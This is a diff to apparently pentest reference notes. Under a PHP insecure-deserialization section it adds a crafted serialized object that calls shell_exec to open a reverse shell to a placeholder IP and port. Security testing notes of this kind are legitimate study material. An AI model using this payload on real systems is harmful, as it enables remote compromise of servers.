@@ -1,4 +1,4 @@
-## Doc
+  ## Doc
 
 - [OWASP Cheatsheet Series - Top 10](https://cheatsheetseries.owasp.org/IndexTopTen.html)
 - [Mozilla Client Docs](https://developer.mozilla.org/en-US/doc)
@@ -406,6 +406,18 @@ php_flag engine off
 
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
 - https://www.saotn.org/exploit-php-mail-get-remote-code-execution/
+
+```php
+<?php
+class Token{
+    public $encode_algo="anything";
+    // exploiting toString() magic method
+    public $decode_algo="shell_exec";
+    // using php for a stable shell
+    public $msg='php${IFS}-r${IFS}\'$s=fsockopen(<IP>,<PORT>);$p=proc_open("/bin/sh",[0=>$s,1=>$s,2=>$s],$x);\'';
+}
+echo urlencode(serialize([new Token()]));
+``` 
 
 #### Phar 
 
